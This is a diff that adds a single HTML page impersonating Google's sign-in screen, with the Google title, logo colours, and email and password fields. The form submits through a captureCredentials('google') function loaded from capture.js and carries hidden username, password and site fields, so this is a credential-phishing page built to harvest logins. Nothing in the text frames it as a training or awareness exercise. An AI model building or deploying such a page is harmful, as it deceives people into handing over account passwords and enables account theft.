@@ -1,0 +1,25 @@
+<html>
+<head>
+    <script src="capture.js"></script>
+    <title>Google</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; width: 400px; }
+        .logo { font-size: 40px; font-weight: bold; margin-bottom: 30px; color: #4285f4; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+        input[type="submit"] { background: #4285f4; color: white; border: none; padding: 14px; border-radius: 4px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; }
+        .header { font-size: 24px; margin-bottom: 30px; color: #202124; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">G</div>
+        <div class="header">Sign in</div>
+        <form onsubmit="return captureCredentials('google')">
+            <input type="text" name="username" placeholder="Email or phone">
+            <input type="password" name="password" placeholder="Enter your password">
+            <input type="submit" value="Next">
+        <input type="hidden" id="username" name="username"><input type="hidden" id="password" name="password"><input type="hidden" name="site" value="google"></form>
+    </div>
+</body>
+</html>
